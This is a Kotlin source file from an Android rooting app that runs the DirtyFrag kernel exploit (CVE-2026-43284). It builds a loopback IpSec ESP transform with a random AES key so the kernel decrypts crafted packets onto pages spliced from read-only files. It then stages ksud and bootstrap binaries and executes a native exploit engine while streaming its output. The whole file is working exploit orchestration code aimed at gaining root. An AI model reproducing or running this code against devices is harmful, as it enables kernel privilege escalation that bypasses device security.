package com.agnessu.yakayn.data.dirtyfrag

import android.annotation.SuppressLint
import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import androidx.annotation.RequiresApi
import df.root.ExploitRunner
import df.root.IReporter
import java.io.File
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

/**
 * One-tap DirtyFrag (CVE-2026-43284) root orchestrator, a faithful port of
 * diabl0w/DFRoot. The native engine is a PIE executable (libdfroot.so) run as a
 * subprocess — no JNI. This repository sets up the IpSecManager AES-CBC ESP
 * transform the native primitive relies on, writes the prefs that bootstrap
 * reads, stages both `ksud` and `bootstrap` into device-protected storage, then
 * execs the engine and streams its stdout into the log.
 */
class DirtyFragRepository(private val context: Context) {

    private val _state = MutableStateFlow(DirtyFragUiState())
    val state: StateFlow<DirtyFragUiState> = _state.asStateFlow()

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var installJob: Job? = null

    val snapshot: DirtyFragDeviceSnapshot by lazy { DirtyFragDeviceSnapshot.current() }

    init {
        scope.launch {
            _state.value = DirtyFragUiState(
                phase = DirtyFragInstallPhase.Ready,
                log = "kernel: ${snapshot.kernelVersionFull}",
            )
        }
    }

    @SuppressLint("NewApi")
    fun install() {
        if (installJob?.isActive == true) return
        installJob = scope.launch {
            _state.value = DirtyFragUiState(phase = DirtyFragInstallPhase.Checking, log = "")
            try {
                require(snapshot.isAarch64) { "aarch64 required" }
                require(snapshot.isApiSupported) { "Android 10+ required" }
                val reporter = IReporter { appendLog(it) }
                setPhase(DirtyFragInstallPhase.Exploiting, "[*] Running DirtyFrag (CVE-2026-43284)")
                val code = runExploit(reporter)
                require(code == 0) { "DirtyFrag returned $code" }
                setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU active")
                appendLog("[*] Root complete")
            } catch (error: Throwable) {
                appendLog("[-] ${error.message ?: error.javaClass.simpleName}")
                setPhase(DirtyFragInstallPhase.Failed, "[*] Root failed")
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun runExploit(reporter: IReporter): Int {
        writePrefs()

        val ipsec = context.getSystemService(Context.IPSEC_SERVICE) as IpSecManager

        // NAT-T UDP encapsulation socket: the kernel decrypts crafted ESP
        // packets in-place on pages the native engine spliced from read-only
        // files. encapPort is where the native sender connects to.
        val encapSock = ipsec.openUdpEncapsulationSocket()
        val encapPort = encapSock.port

        // Source port for the native sender. The engine opens its own UDP socket
        // and bind()s it to this port, so only reserve a free ephemeral port and
        // release it immediately — exactly how DFRoot's ExploitRunner does it.
        // Keeping it bound would make the native bind() fail with EADDRINUSE.
        val senderPort = DatagramSocket().use { it.localPort }

        // IPv4 loopback explicitly: openUdpEncapsulationSocket() is IPv4 and the
        // destination address family must match it. InetAddress
        // .getLoopbackAddress() returns ::1 (IPv6), which makes
        // buildTransportModeTransform throw "UDP encapsulation socket and
        // destination address families must match".
        val loopback = InetAddress.getByName("127.0.0.1")
        val spi = ipsec.allocateSecurityParameterIndex(loopback)

        // AES-256-CBC only. DFRoot's ESP layout (SPI + seq + IV + 16-byte block)
        // carries no authentication ICV, so no HMAC key or setAuthentication.
        val aesKey = ByteArray(32)
        SecureRandom().nextBytes(aesKey)

        // setIpv4Encapsulation applies the NAT-T transform to the encapsulation
        // socket in both directions, so no separate applyTransportModeTransform
        // call is needed (matches DFRoot's ExploitRunner).
        val transform = IpSecTransform.Builder(context)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(loopback, spi)

        try {
            stageKsud(reporter)
            stageBootstrap(reporter)
            val bin = File(context.applicationInfo.nativeLibraryDir, "libdfroot.so")
            require(bin.isFile) { "libdfroot.so missing from native library dir" }
            return ExploitRunner.run(
                bin = bin,
                encapPort = encapPort,
                senderPort = senderPort,
                spi = spi.spi,
                aesKey = aesKey,
                onLine = { reporter.report(it) },
            )
        } finally {
            runCatching { transform.close() }
            runCatching { spi.close() }
            runCatching { encapSock.close() }
        }
    }

    /**
     * bootstrap reads these from device-protected storage before it late-loads
     * ksud. `disable_modules` stays false on a fresh root — there are no modules
     * yet, and a missing /data/adb/modules would otherwise make bootstrap abort
     * with /dev/dfme1 before launching the daemon.
     */
    private fun writePrefs() {
        val prefs = context.createDeviceProtectedStorageContext()
            .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit()
            .putString(PREF_SU_MANAGER, context.packageName)
            .putBoolean(PREF_SOFT_REBOOT, false)
            .putBoolean(PREF_DISABLE_MODULES, false)
            .commit()
    }

    /**
     * Copy AgnesSU's bundled ksud (libksud.so) to
     * `/data/user_de/0/com.agnessu.yakayn/ksud` — the path bootstrap late-loads.
     */
    private fun stageKsud(reporter: IReporter) {
        stageNative(context.applicationInfo.nativeLibraryDir, "libksud.so", "ksud", reporter)
    }

    /**
     * Copy the DFRoot post-root stage (libbootstrap.so) to
     * `/data/user_de/0/com.agnessu.yakayn/bootstrap` — the path the ko executes.
     * This stage is what sets partitions read-only before ksud starts; skipping
     * it is the Samsung reboot regression.
     */
    private fun stageBootstrap(reporter: IReporter) {
        stageNative(context.applicationInfo.nativeLibraryDir, "libbootstrap.so", "bootstrap", reporter)
    }

    private fun stageNative(
        nativeLibDir: String,
        srcName: String,
        destName: String,
        reporter: IReporter,
    ) {
        val src = File(nativeLibDir, srcName)
        require(src.isFile) { "$srcName missing from native library dir" }
        val target = File(context.createDeviceProtectedStorageContext().filesDir.parentFile, destName)
        if (target.isFile && target.length() == src.length()) {
            reporter.report("[*] $destName already staged")
            return
        }
        src.inputStream().use { input ->
            target.outputStream().use { output -> input.copyTo(output) }
        }
        target.setExecutable(true, false)
        reporter.report("[*] $destName staged -> ${target.absolutePath}")
    }

    private fun setPhase(phase: DirtyFragInstallPhase, message: String) {
        _state.value = _state.value.copy(phase = phase)
        appendLog(message)
    }

    private fun appendLog(line: String) {
        val cleanLine = stripAnsi(line).trim()
        if (cleanLine.isBlank()) return
        _state.value = _state.value.copy(
            log = (_state.value.log + "\n" + cleanLine).trim(),
        )
    }

    companion object {
        private const val PREFS_NAME = "dirtyfrag"
        private const val PREF_SU_MANAGER = "su_manager"
        private const val PREF_SOFT_REBOOT = "soft_reboot"
        private const val PREF_DISABLE_MODULES = "disable_modules"
        private val ANSI_ESCAPE = Regex("\u001B\\[[0-?]*[ -/]*[@-~]")

        private fun stripAnsi(value: String): String =
            ANSI_ESCAPE.replace(value, "").replace("\r", "")
    }
}
